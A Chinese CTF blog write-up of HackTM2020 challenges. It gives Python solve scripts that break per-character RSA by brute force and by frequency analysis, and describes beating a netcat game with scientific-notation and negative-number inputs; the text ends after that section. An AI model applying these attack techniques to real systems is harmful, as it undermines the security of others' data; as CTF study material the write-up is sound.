<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="HackTM2020-WriteUp"><meta name="keywords" content="CTF,web,条件竞争,JWT伪造,crypto,RSA攻击,RSA频率表攻击,RSA逐字节爆破"><meta name="author" content="ggb0n"><meta name="copyright" content="ggb0n"><title>HackTM2020-WriteUp | ggb0n's Blog</title><link rel="shortcut icon" href="/avatar.jpg"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#HackTM2020-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">HackTM2020-WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-1"><span class="toc-number">1.1.</span> <span class="toc-text">RSA#1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目分析"><span class="toc-number">1.1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解密代码"><span class="toc-number">1.1.2.</span> <span class="toc-text">解密代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-2"><span class="toc-number">1.2.</span> <span class="toc-text">RSA#2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目分析-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解密代码-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">解密代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Dragon-Sleeps-At-Night"><span class="toc-number">1.3.</span> <span class="toc-text">The Dragon Sleeps At Night</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目分析-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解题"><span class="toc-number">1.3.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Strange-PCAP"><span class="toc-number">1.4.</span> <span class="toc-text">Strange PCAP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目分析-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#键盘记录脚本"><span class="toc-number">1.4.2.</span> <span class="toc-text">键盘记录脚本</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#My-Bank"><span class="toc-number">1.5.</span> <span class="toc-text">My Bank</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目分析-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#解题-1"><span class="toc-number">1.5.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Draw-With-Us"><span class="toc-number">1.6.</span> <span class="toc-text">Draw With Us</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#题目分析-amp-一些攻击尝试"><span class="toc-number">1.6.1.</span> <span class="toc-text">题目分析&amp;一些攻击尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#破解JWT秘钥"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">破解JWT秘钥</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#暴力破解n"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">暴力破解n</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JWT-none-攻击"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">JWT none 攻击</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Expoit"><span class="toc-number">1.6.2.</span> <span class="toc-text">Expoit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">1.7.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="http://q54qbmsca.bkt.clouddn.com/avatar.jpg"></div><div class="author-info__name text-center">ggb0n</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/ggb0n" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">17</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">70</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">8</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Friends Links</div><a class="author-info-links__name text-center" href="https://f61d.github.io" target="_blank" rel="noopener">f61d</a><a class="author-info-links__name text-center" href="https://15h3na0.xyz" target="_blank" rel="noopener">15h3na0</a><a class="author-info-links__name text-center" href="https://sxadmin.github.io" target="_blank" rel="noopener">Myself'</a><a class="author-info-links__name text-center" href="https://diao-diaoupup.cn" target="_blank" rel="noopener">51nd0re1</a><a class="author-info-links__name text-center" href="http://caoyi.site" target="_blank" rel="noopener">Amateur</a><a class="author-info-links__name text-center" href="https://www.cnblogs.com/ph1sh" target="_blank" rel="noopener">ph1sh</a></div></div></div><div id="content-outer"><div class="plain" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">ggb0n's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/links">Friend links</a><a class="site-page" href="/about">About</a><a class="site-page" href="/tools">Tools</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div></div><div class="layout" id="content-inner"><article id="post"><div class="plain" id="post-title">HackTM2020-WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-04</time><span class="post-meta__separator">|</span><i class="fa fa-inbox" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"> CTF学习记录</a><i class="fa fa-angle-right post-meta__separator" aria-hidden="true"></i><i class="fa fa-inbox" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"> 赛题复现</a></div><div class="article-container" id="post-content"><h2 id="HackTM2020-WriteUp"><a href="#HackTM2020-WriteUp" class="headerlink" title="HackTM2020-WriteUp"></a>HackTM2020-WriteUp</h2><p>假期被“关禁闭”，看到战队发的比赛链接，虽然知道自己很菜，题目不是我可以做的，不过还是大胆尝试了，发现一些题目还比较简单[滑稽脸]，这里写一下部分题目的WP。</p>
<h3 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA#1"></a>RSA#1</h3><p>这是一个简单的RSA爆破题。</p>
<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><p>题目给了两个附件：<code>c</code>、<code>rsa.py</code>，其中<code>c</code>的内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Public key:</span><br><span class="line">(65537, 28150970547901913019901824364390497053600856369839321617996700606130553862041378369018779003752433356889118526332329074054728613209407037089320809898343953157935211086135010436283805891893636870991411236307901650696221491790470635225076251966300189483160148297407974155121570252648252906976186499329924342873)</span><br><span class="line"></span><br><span class="line">Encrypted flag:</span><br><span class="line">[24603931406187071861602497345394097692989773194039735745762181586628499407802825983901643034231448504738113184470035863824128031443012073830520233613935485192804104698999763287388765215634314977991988580048221541560353418280294402691661980705832590960497587810514295642811714680627768268704899874164681718449, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 15645290594995180815865397749136800126080704684884296404807344870555186823350216705796063922278419585484662234210001661578549560411864952462380096494781766394542247609648743673312823946783517115542404474786395934886667795692210287283039316418126796934535150832709500306153601987121172178183970841498331059732, 24345863558959407738249127568820138362115734211146549194534219311913032290216606859385934708675962835857804566049600710875035366973110422262131331932310524891713319358676673958738776644229757625523955354996402750265022578843637525183704187498194489645838490640529841182709661371499013082259193633000753627261, 9620679224297488175028367924764722982789333194446063577221477359704180638294602848741035585656113543497776415635770748468725814916994577398023154224563920936523717884116880223345204061598438291740007518025998041449406726084042681798053863495542392481059281588020105313791046017356493739244555377217866496734, 1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279, 20629854768856798537062426042570334097651328955665698429979954410631113160492201197690192324881508105172595216229624523572595589920695165876501026993810936392510720968159305964832449680889041278532807173859579419197780294984519222830572413180237776797800176462492384318120546495539728732366110782215071262307, 7440918084186181327822271261394344901791253526257166181264874776746516620936925799031445704193589071453959493392065321806281801023425299535553522582376879027448581379760896052013060957519595664095702210758316558762834545655992756483227787274192094065257224706388623944855362716578806372564148647945479173348, 5097867843777034076271397095201528351784693372027998615436445410912131141882225577577253530396333413579756394884096318434100382509189974240357351425474190558456256750742731090012822064840481143528081027106843123030275420215136304130321013605031261372665636366377162666476737296028608455229357416005773064242, 10420107412794383499391199999666100864853724770814620968725971207705900061273163202891569477729023724554388008575891113425781557296798472693974759813058067631655217722786373465395279381307973425004404348124524059844749313287030234750535347511172780349725636807760402334957881556461382950021814486095167001394, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 16657126895659048065404729920028465477385009450133540950695155983380795627778054526133891673615252510518969355629562948102050307259107355106086468465392660721567070464708776158039303608428552547481825035736610837329720474688421062759594907620576318249542577396722737724172954532394471909440668625218820801756, 11113777356910731413424023299582648618258376222028450254478672148119889617557563576704932635131420845868165014982665717620845578039880527701593963719893467068820107811384041511295664833904504511210342105242330522375476482706044695838957591685781703894244561607764476555630573446589408768780659378128082633769, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 1681724029430984846089508679185107538104072555994133932050319175633667369916570440070548756805254789524599169177371471218251246349461689959989338169394649813424706418737543924129213419625988100326558802566046751879531469160120914735332858786199496335523515150741728027296830843112416558460932541777024522279, 5237767970074646857079948735567615361735616179074197239639640947679550920349684166643572837235712904929824521258264241503059989875517915784117038966236672390569320206379357882906463342282254405974383459878863044723383164329146669331810709270455492110346838097216174137176255793792848357953314563364460847842, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670, 278354276293884030290100330445865286604723740111170856624965259573282278044823323212960304154629174664076141280100412502135750130875356944835909175355370317285768658282746817782130476757714384697086179400629156643250500432197002583758692394681401772203578628635926749457621478296182304772136118691761841359, 6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542, 21353765873487781085375016306418205544750755310255410963646737671193146222650262290683259548572190880304009015662963424520575937651278866672082973874806201031606257157229306007587966460187818647603633973019548401357989358306250139692325474674826791149726161678649996852062656272851387461089863388359261125336, 11226318059664066669163529308725576208632153806776762372429671026861927737060205604020741904348343722215670471225630839065129589767356765848271000166982882271636977663052775953958080543340165408211633442938366994031562890034541604362383645601883118173819506187865617998294930587997187071040181458961091560176, 20576388598886140095325204584799302384454378372204683348252463729525849583734948105765087991438423260690623246579570440405616572326057536248148020737810766134083795050076636686776809469271643188562482921546497071402873405706504773345621716428511481598704631451463399778602486417840466985891815649711178813963, 17347447662661486040040289855519394974371562320877472776529836975445205017304164550202099250096382852783253959549113036367974281750823938616836362593312254792770954856762797438690474329666549947795964992533463700161635382925555835347885819042031312006167190561233042383984087765920275010577545908085026177611, 11788628214684738246695632901992250075758959059858474645166125685861157046466064692980236734739634298802473894878268029860203026238925142258303727438570051822763330338744774300757888262747314093511013562545738571326771345495509434761853742569509480619380000424215527153118231084573851377049921456961916278761, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 2141625583250052666579569568613448089970148215959031795439930595139028085767825695294403905882459409861220995951141855281841435481587946825079031782977651718402048988278639212978854590412709087674713750292922397103941195760574072700517109381299788645871729355745594573785064162048047595009933642068871994670, 2710029303357232932696197225263692040597986927359269224740812600224998707144266259851604978553286889767425982708691908438984279442981540971935737617354609856642312100797081348174935195638083002333058089328102430432526612805955273581245352312630845237670744276402867230550537275379675828467791243032108754996, 19981107233593350929447953514006501458466479260151660185153999799085657467921097940751860717309377498501638075002136637344148955811617399850718322497572421311807629329642551519284713638882025500074565475569618691516951449764680555447185364165687596161053684299589053909233984617244886185728811651967713024530, 3975884358027162862622932959187611984655247354547659825042810425039322096401899672988989768997134724085482147901304365437476311647149733392577446833370358728610677436154877051592307539990184750467273668379065865808900410057533079113476991204462719784464847498582643056503810805516315622314948257403761762299, 6039667595601233082552071610487048398346324705021423176423484623705376133358539134558362499891954091431687578305623106726900655384011241742715735786166290331136153240702822544221903404870992713778423167867663948083662620087859096707381620051266745156545213726214080049764382107442159825610310695543673475542, 14296542628093736444815382636071360035549021313467366701986569710120268508807886041986007828960248665683292143486565404978073122476968882030310174125355932205646388813061197657253533595700948593692407928813318978600474254105007396254987998953819782624738628334271910759242195864082910860797444993756044746481, 20895198446192697825002890636650624361863759520944494391240191454443921345578043873584884838772334163748883476104011030592329948454531053024873263786017045083052443924403769542324123323834338391361149767913830998218951574784777785739566046139742309557536025214334831372509789246522325522982945241815388133477, 7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442, 7983594351048693624291138893287137601848867970873700373034058935656045095987011116108642350616654713531373295621458596238107660073931212524833777531450461876588350132328332972361857441613098452082271331281504722310376573085001395356078670960667878342134517577992585442881605030717788248137764480486762452442, 23267174349531278768420819619439317179083929128083924515569762521057285892931325108327037262091624670335579302436476096123152288550738706103166820604983405317430467198343871458522070337902643863890959573514405066297449924638838605501211486861582957963752388608487593217237563529201436917108304692859773404548]</span><br></pre></td></tr></table></figure>
<p>易知，该文件提供了RSA的公钥：(e,n)，以及加密后的flag，我们发现，flag的密文是多个大数，可知是逐字节对flag进行加密的，那么进行简单的爆破即可解密。</p>
<p>再来看看<code>rsa.py</code>的内容：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> my_math <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    x, y, u, v = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b % a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b, a, x, y, u, v = a, r, u, v, m, n</span><br><span class="line">        gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_keys</span><span class="params">(p, q)</span>:</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    gcd, d, b = egcd(e, phi)</span><br><span class="line">    <span class="comment"># Keys:((pub),  (priv))</span></span><br><span class="line">    <span class="keyword">return</span> ((e, n), (d, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(key, p)</span>:</span></span><br><span class="line">    e, n = key</span><br><span class="line">    cipher = [pow(ord(char), e, n) <span class="keyword">for</span> char <span class="keyword">in</span> p]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(pk, c)</span>:</span></span><br><span class="line">    key, n = pk</span><br><span class="line">    plain = [chr(pow(char, key, n)) <span class="keyword">for</span> char <span class="keyword">in</span> c]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = next_prime(random.SystemRandom().getrandbits(<span class="number">512</span>))</span><br><span class="line">q = next_prime(random.SystemRandom().getrandbits(<span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">flag_key=gen_keys(p, q)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Public key:"</span>)</span><br><span class="line">print(flag_key[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">flag_c=(enc(flag_key[<span class="number">0</span>], flag))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Encrypted flag:"</span>)</span><br><span class="line">print(flag_c)</span><br></pre></td></tr></table></figure>
<p>该脚本中是一些RSA的加密、解密函数，其中提供了p和q都是512bit的素数，因此模数n是1024bit的，打消分解n的念头（这里不得不说一下，有些比赛的1024bit以上的模数n在<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> 上是有上传的，有时候可以先拿去分解试试）<br>我们从<code>enc</code>函数的加密机制发现，它是对明文进行逐字符进行加密，再次印证了是逐字节爆破，直接爆破flag即可。</p>
<h4 id="解密代码"><a href="#解密代码" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'c'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">'\n'</span>)</span><br><span class="line">    e = int(data[<span class="number">1</span>].split(<span class="string">', '</span>)[<span class="number">0</span>][<span class="number">1</span>:])</span><br><span class="line">    n = int(data[<span class="number">1</span>].split(<span class="string">', '</span>)[<span class="number">1</span>][:<span class="number">-1</span>])</span><br><span class="line">    flag_enc = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> data[<span class="number">4</span>][<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">', '</span>)]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag_enc:</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">if</span> pow(ord(c), e, n) == f:</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<h3 id="RSA-2"><a href="#RSA-2" class="headerlink" title="RSA#2"></a>RSA#2</h3><h4 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h4><p>与上个题目一样，附件中包含两个文件<code>c</code>、<code>rsa.py</code>，并且<code>rsa.py</code>与上题一样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> my_math <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    x, y, u, v = <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> a != <span class="number">0</span>:</span><br><span class="line">        q, r = b//a, b % a</span><br><span class="line">        m, n = x-u*q, y-v*q</span><br><span class="line">        b, a, x, y, u, v = a, r, u, v, m, n</span><br><span class="line">        gcd = b</span><br><span class="line">    <span class="keyword">return</span> gcd, x, y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_keys</span><span class="params">(p, q)</span>:</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    gcd, d, b = egcd(e, phi)</span><br><span class="line">    <span class="comment"># Keys:((pub),  (priv))</span></span><br><span class="line">    <span class="keyword">return</span> ((e, n), (d, n))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(key, p)</span>:</span></span><br><span class="line">    e, n = key</span><br><span class="line">    cipher = [pow(ord(char), e, n) <span class="keyword">for</span> char <span class="keyword">in</span> p]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(pk, c)</span>:</span></span><br><span class="line">    key, n = pk</span><br><span class="line">    plain = [chr(pow(char, key, n)) <span class="keyword">for</span> char <span class="keyword">in</span> c]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = next_prime(random.SystemRandom().getrandbits(<span class="number">512</span>))</span><br><span class="line">q = next_prime(random.SystemRandom().getrandbits(<span class="number">512</span>))</span><br><span class="line"></span><br><span class="line">flag_key=gen_keys(p, q)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Public key:"</span>)</span><br><span class="line">print(flag_key[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">flag_c=(enc(flag_key[<span class="number">0</span>], flag))</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Encrypted flag:"</span>)</span><br><span class="line">print(flag_c)</span><br></pre></td></tr></table></figure>
<p>但是密文文件<code>c</code>内容不同，其中给出了逐字节加密的密文列表，但是并未给出公钥：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Public key:</span><br><span class="line">[DATA CORRUPTED]</span><br><span class="line"></span><br><span class="line">Encrypted flag:</span><br><span class="line">[34220770932871364013976724839545041417474666615300575941746695940071552482886462087439379719184240006479394129946558717984964307444237521284361087031583504037093765914149168694482266218524635203263596760639253965500892625668716519628460563860957678979373258071483670494006067028836185890388591731283716604832</span><br><span class="line">...]</span><br><span class="line">这里列表中共有1111个字符的密文</span><br></pre></td></tr></table></figure>
<p>没有公钥，怎么解密？？？显然也不是攻击私钥，而是直接对密文进行攻击。<br>我们看到，密文列表中有1111个密文，一般的flag不可能这么长，而这里给出了这么多密文，并且没有给出公钥，解密思路便很显然：<strong>利用字母频率攻击出明文</strong>。<br>这也是密码学常用的攻击方法之一，主要思路是：英文的字母在使用中出现的次数大致满足了一个频率表(参考<a href="https://en.wikipedia.org/wiki/Letter_frequency" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Letter_frequency</a> )，我们可以把这1111个密文的出现频率统计出来，然后与字母频率对应，从而攻击出明文。</p>
<h4 id="解密代码-1"><a href="#解密代码-1" class="headerlink" title="解密代码"></a>解密代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'c'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read().split(<span class="string">'\n'</span>)</span><br><span class="line">    flag_enc = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> data[<span class="number">4</span>][<span class="number">1</span>:<span class="number">-1</span>].split(<span class="string">', '</span>)]</span><br><span class="line"></span><br><span class="line">freq_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag_enc:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> f <span class="keyword">in</span> freq_dict:</span><br><span class="line">        freq_dict[f] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        freq_dict[f] += <span class="number">1</span></span><br><span class="line">freq = sorted(list(freq_dict.items()), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">freq.reverse()</span><br><span class="line"></span><br><span class="line">english_freq = [<span class="string">' '</span>, <span class="string">'E'</span>,<span class="string">'T'</span>,<span class="string">'A'</span>,<span class="string">'I'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'L'</span>,<span class="string">'H'</span>,</span><br><span class="line">                <span class="string">'C'</span>,<span class="string">'M'</span>,<span class="string">'D'</span>,<span class="string">'Y'</span>,<span class="string">'P'</span>,<span class="string">'U'</span>,<span class="string">'W'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'.'</span>,<span class="string">'V'</span>,</span><br><span class="line">                <span class="string">'B'</span>,<span class="string">'X'</span>,<span class="string">'K'</span>,<span class="string">','</span>,<span class="string">'Q'</span>, <span class="string">'Z'</span>, <span class="string">'\''</span>, <span class="string">'0'</span>, <span class="string">'9'</span>]</span><br><span class="line">translator = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> enumerate(english_freq):</span><br><span class="line">    translator[freq[i][<span class="number">0</span>]] = c</span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> flag_enc:</span><br><span class="line">    <span class="keyword">if</span> f <span class="keyword">in</span> translator:</span><br><span class="line">        print(translator[f], end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<h3 id="The-Dragon-Sleeps-At-Night"><a href="#The-Dragon-Sleeps-At-Night" class="headerlink" title="The Dragon Sleeps At Night"></a>The Dragon Sleeps At Night</h3><p>一道misc题，考脑洞，也考基本知识，多做misc确实能开眼界啊！</p>
<h4 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h4><p><code>netcat</code>连接目标IP之后进入一个游戏盒，秉承misc一大传统：打游戏。<br><img src="http://www.ggb0n.cool/images/HackTM-WP1.png" alt=""><br>这个题目是一个屠龙的游戏，从图中可以看到，有以下功能：<br>去商店：这里有从1级到5级的屠龙宝刀，屠龙！拿flag~<br>去工作：赚钱买刀！屠龙！拿flag~<br>去龙穴：屠龙！拿flag~<br>回家：休息，为了屠龙！拿flag~<br>储藏室：放宝刀</p>
<p>解题关键点：</p>
<ul>
<li>1、这里去工作的话最后拿工资的时候会让输入工作天数，1刀/天，但是每次之多输入三个字符，因此常数的话最多999…怎么办呢？</li>
<li>2、回家休息的时候可以输入休息的天数，但是休息会“降低”储藏室中宝刀的级别，1级/天，不过…休息天数正负不限~<br>这两点就是屠龙的关键。</li>
</ul>
<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>根据前面的分析，我们需要先去工作赚钱，在结账的时候输入<code>9e9</code>的话其实就可以得到9 billion刀，这足以买到5级宝刀了。其实就是利用科学计数法绕过限制，CTF中很多题目借用了这一点。<br>此时去屠龙的话，仍然会失败，因为需要6级宝刀，但是商店没有啊！利用关键点2，我们先买5级宝刀并放在储藏室，然后去睡<code>-1</code>天，便得到了一把6级宝刀，再去屠龙便能顺利拿到flag了。<br><img src="http://www.ggb0n.cool/images/HackTM-WP2.png" alt=""></p>
